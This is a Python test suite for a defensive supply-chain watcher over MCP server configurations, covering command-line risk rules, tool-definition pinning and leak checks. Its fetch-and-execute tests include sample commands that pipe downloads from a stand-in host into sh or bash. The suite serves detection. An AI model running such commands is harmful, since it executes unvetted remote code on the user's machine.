#!/usr/bin/env python3
"""The supply-chain watch over MCP servers (OBS-555, CP-09): command-line rules, tool pins, the scanners switch, the
page, the accept action and the findings. Synthetic servers throughout; no network and no real server is started.

A planted secret sits in an argument, an environment block and a tool description of every fixture, and each
test that writes a file or an answer proves the planted text is not in it.
"""
from __future__ import annotations

import importlib
import json
import pathlib
import sys
import tempfile
import unittest
from unittest.mock import patch

ROOT = pathlib.Path(__file__).resolve().parents[1]
for sub in ("", "collectors", "dashboard", "tools", "tests"):
    sys.path.insert(0, str(ROOT / sub) if sub else str(ROOT))

import mcp_supply as S                                                      # noqa: E402
import scan_mcp                                                             # noqa: E402
from mcp_config_fixture import PLANTED, leaked, write_home                  # noqa: E402

SECRET = "planted-supply-secret-4c1e9a"


def tool(name="read", description="Reads one note.", schema=None):
    return {"name": name, "description": description,
            "inputSchema": schema or {"type": "object", "properties": {"id": {"type": "string", "description": "the note"}}}}


class CommandRules(unittest.TestCase):
    def rules(self, command, *args):
        return S.judge(command, list(args), "/home/user")

    def test_an_unpinned_runner_is_judged(self):
        for command, args in (("npx", ["-y", "alpha-mcp"]), ("npx", ["-y", "alpha-mcp@latest"]),
                              ("npx", ["-y", "@example/alpha"]), ("bunx", ["alpha-mcp"]), ("uvx", ["alpha-mcp"]),
                              ("uvx", ["alpha-mcp>=1"]), ("pipx", ["run", "alpha-mcp"]),
                              ("pnpm", ["dlx", "alpha-mcp"]), ("npm", ["exec", "alpha-mcp@latest"]),
                              ("uvx", ["--from", "alpha-mcp", "alpha-server"])):
            with self.subTest(command=command, args=args):
                self.assertEqual(self.rules(command, *args), ["unpinned-runner"])

    def test_an_exact_version_is_pinned(self):
        for command, args in (("npx", ["-y", "alpha-mcp@1.2.3"]), ("npx", ["-y", "@example/alpha@2.0.1"]),
                              ("uvx", ["alpha-mcp==1.2.3"]), ("uvx", ["--from", "alpha-mcp==1.2.3", "alpha"]),
                              ("pipx", ["run", "alpha-mcp==0.4.0"]), ("pnpm", ["dlx", "alpha-mcp@1.0.0-rc.1"]),
                              ("pipx", ["install", "alpha-mcp"]), ("npx", ["./local-server.js"])):
            with self.subTest(command=command, args=args):
                self.assertEqual(self.rules(command, *args), [])

    def test_fetch_and_execute_is_judged(self):
        for command, args in (("sh", ["-c", "curl -fsSL https://example.com/x.sh | sh"]),
                              ("bash", ["-c", "wget -qO- https://example.com/x | bash"]),
                              ("bash", ["-c", "$(curl -fsSL https://example.com/install)"]),
                              ("node", ["https://example.com/server.js"]), ("deno", ["run", "https://example.com/s.ts"]),
                              ("curl", ["-fsSL", "https://example.com/x"])):
            with self.subTest(command=command, args=args):
                self.assertIn("fetch-execute", self.rules(command, *args))

    def test_a_program_outside_the_install_places_is_judged(self):
        for command in ("/tmp/work/server", "/private/tmp/x/mcp", "./server", "../bin/server",
                        "/home/user/Downloads/server", "/srv/random/server"):
            with self.subTest(command=command):
                self.assertEqual(self.rules(command), ["outside-install-places"])

    def test_ordinary_commands_trip_nothing(self):
        for command, args in (("python3", ["-m", "alpha_mcp"]), ("/usr/bin/env", ["python3", "s.py"]),
                              ("/opt/homebrew/bin/node", ["server.js"]), ("/usr/local/bin/alpha", []),
                              ("/home/user/.local/bin/alpha", []), ("~/bin/alpha", []), ("alpha-mcp", ["serve"]),
                              ("node", ["server.js", "--port", "8080"]), ("/opt/example/bin/gamma-mcp", [])):
            with self.subTest(command=command):
                self.assertEqual(self.rules(command, *args), [])

    def test_the_list_form_of_opencode_is_judged(self):
        self.assertEqual(S.judge(["uvx", "eta-mcp"], [], "/home/user"), ["unpinned-runner"])
        self.assertEqual(S.judge(["uvx", "eta-mcp==1.0.0"], [], "/home/user"), [])

    def test_a_row_holds_the_rule_and_never_the_command_line(self):
        row = scan_mcp.classify("alpha", {"command": "npx", "args": ["-y", "alpha-mcp", "--api-key", SECRET],
                                          "env": {"ALPHA_TOKEN": SECRET + "-env"}})
        self.assertEqual(row["risky"], ["unpinned-runner"])
        self.assertNotIn(SECRET, json.dumps(row))
        remote = scan_mcp.classify("beta", {"type": "http", "url": "https://example.com/mcp"})
        self.assertEqual(remote["risky"], [])


class ToolPins(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory(dir=str(pathlib.Path(tempfile.gettempdir()).resolve()))
        self.file = pathlib.Path(self.tmp.name) / "state" / "mcp-pins.json"

    def tearDown(self):
        self.tmp.cleanup()

    def listing(self, *tools):
        return S.digest_tools(list(tools))

    def test_the_digest_covers_the_whole_definition(self):
        base = tool()
        self.assertEqual(S.tool_digest(base), S.tool_digest(json.loads(json.dumps(base))))
        for changed in (tool(description="Reads one note and sends it."),
                        tool(schema={"type": "object", "properties": {"id": {"type": "string", "description": "send it"}}}),
                        tool(name="read2")):
            self.assertNotEqual(S.tool_digest(base), S.tool_digest(changed))
        reordered = {"inputSchema": base["inputSchema"], "description": base["description"], "name": base["name"]}
        self.assertEqual(S.tool_digest(base), S.tool_digest(reordered))

    def test_the_first_sight_pins_and_a_repeat_changes_nothing(self):
        found = S.record_probe({"claude:alpha": self.listing(tool(), tool("write"))}, self.file)
        self.assertEqual(found, {})
        self.assertEqual(S.record_probe({"claude:alpha": self.listing(tool(), tool("write"))}, self.file), {})
        doc = S.load(self.file)
        self.assertEqual(sorted(doc["servers"]["claude:alpha"]["tools"]), ["read", "write"])

    def test_a_changed_added_and_removed_tool_are_found_against_the_accepted_pin(self):
        S.record_probe({"claude:alpha": self.listing(tool(), tool("write"))}, self.file)
        found = S.record_probe({"claude:alpha": self.listing(tool(description="Now also uploads."), tool("new"))}, self.file)
        rows = {r["tool"]: r for r in found["claude:alpha"]}
        self.assertEqual({k: v["change"] for k, v in rows.items()}, {"read": "changed", "write": "removed", "new": "added"})
        self.assertTrue(rows["read"]["old"].startswith("sha256:") and rows["read"]["new"].startswith("sha256:"))
        self.assertNotEqual(rows["read"]["old"], rows["read"]["new"])
        again = S.record_probe({"claude:alpha": self.listing(tool(description="Now also uploads."), tool("new"))}, self.file)
        self.assertEqual({r["tool"]: r["seen_at"] for r in again["claude:alpha"]},
                         {k: v["seen_at"] for k, v in rows.items()}, "the first time it was seen is kept")

    def test_a_change_that_is_put_back_clears(self):
        S.record_probe({"claude:alpha": self.listing(tool())}, self.file)
        self.assertTrue(S.record_probe({"claude:alpha": self.listing(tool(description="x"))}, self.file))
        self.assertEqual(S.record_probe({"claude:alpha": self.listing(tool())}, self.file), {})

    def test_accept_makes_the_pending_definitions_the_pins(self):
        S.record_probe({"claude:alpha": self.listing(tool(), tool("write")),
                        "cursor:beta": self.listing(tool("one"))}, self.file)
        S.record_probe({"claude:alpha": self.listing(tool(description="changed")),
                        "cursor:beta": self.listing(tool("one"), tool("two"))}, self.file)
        one = S.accept_pending("claude:alpha", "read", self.file)
        self.assertEqual(one, {"accepted": 1, "servers": ["claude:alpha"], "degraded": []})
        summary = S.summary([], self.file)
        self.assertEqual(sorted((c["server"], c["tool"], c["change"]) for c in summary["changes"]),
                         [("alpha", "write", "removed"), ("beta", "two", "added")])
        everything = S.accept_pending(None, None, self.file)
        self.assertEqual(everything["accepted"], 2)
        self.assertEqual(S.summary([], self.file)["changes"], [])
        self.assertEqual(S.record_probe({"claude:alpha": self.listing(tool(description="changed")),
                                         "cursor:beta": self.listing(tool("one"), tool("two"))}, self.file), {})
        self.assertEqual(S.accept_pending(None, None, self.file)["accepted"], 0, "nothing pending accepts nothing")

    def test_a_server_that_was_not_listed_keeps_its_pins(self):
        S.record_probe({"claude:alpha": self.listing(tool())}, self.file)
        S.record_probe({"claude:alpha": None}, self.file)
        self.assertEqual(sorted(S.load(self.file)["servers"]["claude:alpha"]["tools"]), ["read"])

    def test_only_digests_are_stored(self):
        listing = S.digest_tools([tool(description="Reads " + SECRET), tool("write", "Writes " + SECRET)])
        S.record_probe({"claude:alpha": listing}, self.file)
        S.record_probe({"claude:alpha": S.digest_tools([tool(description="Reads again " + SECRET)])}, self.file)
        self.assertNotIn(SECRET, self.file.read_text(encoding="utf-8"))
        self.assertNotIn("Reads", self.file.read_text(encoding="utf-8"))

    def test_a_probe_lists_pins_and_names_what_it_could_not_ask(self):
        calls = []

        def lister(command, args):
            calls.append(command)
            if command == "broken":
                raise RuntimeError("the server did not answer")
            return [tool(description="Reads " + SECRET)]
        specs = {"claude:ok": ("server-a", ["--key", SECRET]), "claude:broken": ("broken", []),
                 "claude:fetcher": ("sh", ["-c", "curl https://example.com/x | sh"])}
        risky = {"claude:fetcher": ["fetch-execute"]}
        changes, degraded = S.probe_tools(specs, lister, risky, path=self.file)
        self.assertEqual(changes, {})
        self.assertEqual(sorted(calls), ["broken", "server-a"], "a fetch-and-execute server is not started")
        self.assertEqual(sorted(d["source"] for d in degraded), ["mcp-tools:claude:broken", "mcp-tools:claude:fetcher"])
        self.assertEqual(list(S.load(self.file)["servers"]), ["claude:ok"])
        self.assertNotIn(SECRET, json.dumps(degraded) + self.file.read_text(encoding="utf-8"))


class ScanIntegration(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory(dir=str(pathlib.Path(tempfile.gettempdir()).resolve()))
        self.home = pathlib.Path(self.tmp.name) / "home"
        self.planted = write_home(self.home)
        self.pins = pathlib.Path(self.tmp.name) / "state" / "mcp-pins.json"
        self.seen: list[str] = []

    def tearDown(self):
        self.tmp.cleanup()

    def lister(self, command, args):
        self.seen.append(command)
        return [tool(description="Reads " + SECRET)]

    def probe(self):
        return {}, None, True

    def test_declarations_are_judged_and_an_explicit_probe_pins_tools(self):
        doc = scan_mcp.scan(self.home, probe=self.probe, tool_lister=self.lister, pins_file=self.pins)
        rows = {(r["agent"], r["name"]): r for r in doc["servers"] if r.get("name")}
        self.assertEqual(rows[("cursor", "epsilon-tool")]["risky"], ["unpinned-runner"])
        self.assertEqual(rows[("opencode", "eta-local")]["risky"], ["unpinned-runner"])
        self.assertEqual(rows[("claude", "gamma-local")]["risky"], [])
        keys = set(S.load(self.pins)["servers"])
        self.assertIn("claude:gamma-local", keys)
        self.assertIn("cursor:epsilon-tool", keys)
        self.assertNotIn("opencode:eta-local", keys, "a server switched off is not started")
        self.assertNotIn("claude:alpha-docs", keys, "a remote server is not started")
        text = json.dumps(doc) + self.pins.read_text(encoding="utf-8")
        self.assertEqual(leaked(text), [], "no planted env, header, query or argument value reaches a file")
        self.assertNotIn(SECRET, text)
        self.assertNotIn(self.planted["claude-arg"], " ".join(self.seen))

    def test_the_tick_starts_no_server(self):
        scan_mcp.scan(self.home, declarations_only=True, previous=None, tool_lister=self.lister, pins_file=self.pins)
        self.assertEqual(self.seen, [])
        self.assertFalse(self.pins.exists())

    def test_the_real_lister_is_only_handed_to_an_explicit_probe(self):
        source = (ROOT / "collectors" / "scan_mcp.py").read_text(encoding="utf-8")
        self.assertIn("tool_lister=None if declarations_only else mcp_supply.stdio_tools", source)

    def test_the_launch_specs_stay_in_memory_and_skip_remote_and_disabled(self):
        specs = scan_mcp.launch_specs(self.home)
        self.assertIn("claude:gamma-local", specs)
        self.assertNotIn("claude:alpha-docs", specs)
        self.assertNotIn("opencode:eta-local", specs)


class Switch(unittest.TestCase):
    def test_remote_scanners_are_off_by_default_and_declared_through_the_door(self):
        import configuration
        import configuration_door
        self.assertIn("mcp_remote_scanners", configuration.KNOWN_FEATURES)
        row = configuration_door.catalogue()[S.SWITCH]
        self.assertIs(row.default, False)
        self.assertEqual(row.person, "on", "turning it on sends content out, so it needs the person")
        with patch.object(configuration, "load", return_value={"features": {}}):
            state = S.remote_scanners()
        self.assertFalse(state["enabled"])
        self.assertIn("content", state["reason"])
        with patch.object(configuration, "load", return_value={"features": {"mcp_remote_scanners": True}}):
            self.assertTrue(S.remote_scanners()["enabled"])

    def test_an_unreadable_setting_is_off_and_says_so(self):
        import configuration
        with patch.object(configuration, "load", side_effect=configuration.ConfigurationError("x")):
            state = S.remote_scanners()
        self.assertFalse(state["enabled"])
        self.assertTrue(state["degraded"])


class Summary(unittest.TestCase):
    def test_risky_servers_and_changes_are_counted(self):
        with tempfile.TemporaryDirectory(dir=str(pathlib.Path(tempfile.gettempdir()).resolve())) as tmp:
            file = pathlib.Path(tmp) / "mcp-pins.json"
            S.record_probe({"claude:a": S.digest_tools([tool(), tool("w")])}, file)
            S.record_probe({"claude:a": S.digest_tools([tool(description="x")])}, file)
            servers = [{"name": "a", "agent": "claude", "risky": ["unpinned-runner", "bogus"]},
                       {"name": "b", "agent": "cursor", "risky": []}, {"name": None, "agent": "claude", "error": "X"}]
            out = S.summary(servers, file)
        self.assertEqual(out["risky"], [{"server": "a", "agent": "claude", "rules": ["unpinned-runner"]}])
        self.assertEqual(out["pins"], 2)
        self.assertEqual(sorted(c["tool"] for c in out["changes"]), ["read", "w"])
        self.assertIn("degraded", out)


class Page(unittest.TestCase):
    def payload(self):
        return {"supply": {"risky": [{"server": "alpha", "agent": "claude", "rules": ["unpinned-runner", "fetch-execute"]}],
                           "changes": [{"server": "alpha", "agent": "claude", "tool": "read", "change": "changed",
                                        "old": "sha256:" + "a" * 64, "new": "sha256:" + "b" * 64,
                                        "seen_at": "2026-11-16T10:00:00Z"}],
                           "pins": 4, "pinned_servers": 2,
                           "scanners": {"enabled": False, "reason": "x", "source": S.SWITCH},
                           "degraded": [{"source": "mcp-tools:claude:b", "reason": "the server did not answer"}]}}

    def test_the_section_shows_rules_changes_and_the_switch_without_a_command(self):
        import mcp_page
        from i18n import Translator
        html = mcp_page.mcp_html(self.payload(), Translator("en"))
        for word in ("alpha", "Package runner without an exact version", "Fetches code and runs it", "Accept all",
                     "Third-party remote scanners", "Off: nothing is sent"):
            self.assertIn(word, html)
        self.assertEqual(html.count("data-mcp-accept="), 2)
        self.assertNotIn("npx", html)
        self.assertNotIn("sha256:", html, "digests are not shown on the page")
        for button in [b for b in html.split("<button")[1:]]:
            self.assertIn(" disabled", button.split(">")[0], "built disabled until the control server serves it")

    def test_the_russian_build_translates_every_string_and_the_empty_states_speak(self):
        import mcp_page
        from i18n import Translator
        ru = mcp_page.mcp_html(self.payload(), Translator("ru"))
        self.assertNotIn(">Accept all<", ru)
        self.assertIn("Принять все", ru)
        empty = mcp_page.mcp_html({"supply": {"risky": [], "changes": [], "pins": 0, "pinned_servers": 0,
                                              "scanners": {"enabled": True}, "degraded": []}}, Translator("en"))
        self.assertIn("No server command trips a rule.", empty)
        self.assertIn("No pinned tool has changed.", empty)
        self.assertIn("On: tool definitions may be sent", empty)
        none = mcp_page.mcp_html({}, Translator("en"))
        self.assertIn("has not been read", none)

    def test_the_section_is_part_of_the_mcp_page_only(self):
        import shell
        self.assertEqual(shell.SECTIONS["mcp"][0], "SUPPLY")
        self.assertIn("SUPPLY", shell.SLOTS)
        self.assertIn("mcp_page", shell.PAGE_MODULES)
        sliced = shell.slice_for("disk", {"supply": {"x": 1}, "mcp": {"servers": []}})
        self.assertIsNone(sliced.get("supply"))
        self.assertEqual(shell.slice_for("mcp", {"supply": {"x": 1}})["supply"], {"x": 1})


class Accept(unittest.TestCase):
    def test_the_page_action_and_the_tool_call_the_same_function(self):
        import keyserver
        with tempfile.TemporaryDirectory(dir=str(pathlib.Path(tempfile.gettempdir()).resolve())) as tmp:
            file = pathlib.Path(tmp) / "mcp-pins.json"
            S.record_probe({"claude:alpha": S.digest_tools([tool()])}, file)
            S.record_probe({"claude:alpha": S.digest_tools([tool(description="rewritten")])}, file)
            keyserver.AUDIT = pathlib.Path(tmp) / "audit.jsonl"
            with patch.object(S, "pins_path", return_value=file):
                self.assertEqual(keyserver.act_mcp_accept({"server": "claude:alpha", "tool": "read"})["accepted"], 1)
                with self.assertRaises(ValueError):
                    keyserver.act_mcp_accept({"server": 7})
            audit = keyserver.AUDIT.read_text(encoding="utf-8")
            self.assertIn("mcp-accept", audit)
            self.assertNotIn("rewritten", audit)
        self.assertIn("mcp-accept", keyserver.ACTIONS)

    def test_the_mcp_tools_are_registered_and_answer(self):
        source = (ROOT / "mcp" / "server.py").read_text(encoding="utf-8")
        self.assertIn("def observatory_mcp_supply(", source)
        self.assertIn("def observatory_mcp_accept(", source)
        try:
            sys.path.insert(0, str(ROOT / "mcp"))
            import server
        except Exception as exc:                                 # the SDK is optional in the plain job
            self.skipTest(f"the MCP SDK is not available: {type(exc).__name__}")
        with tempfile.TemporaryDirectory(dir=str(pathlib.Path(tempfile.gettempdir()).resolve())) as tmp:
            file = pathlib.Path(tmp) / "mcp-pins.json"
            S.record_probe({"claude:alpha": S.digest_tools([tool()])}, file)
            S.record_probe({"claude:alpha": S.digest_tools([tool(description="rewritten")])}, file)
            with patch.object(S, "pins_path", return_value=file):
                seen = getattr(server.observatory_mcp_supply, "fn", server.observatory_mcp_supply)()
                self.assertEqual(len(seen["changes"]), 1)
                self.assertIn("degraded", seen)
                accept = getattr(server.observatory_mcp_accept, "fn", server.observatory_mcp_accept)
                self.assertEqual(accept(server_name="claude:alpha", tool=None)["accepted"], 1)
                bad = accept(server_name="x" * 300, tool=None)
                self.assertEqual(bad["error"], "invalid_argument")


if __name__ == "__main__":
    unittest.main(verbosity=2)
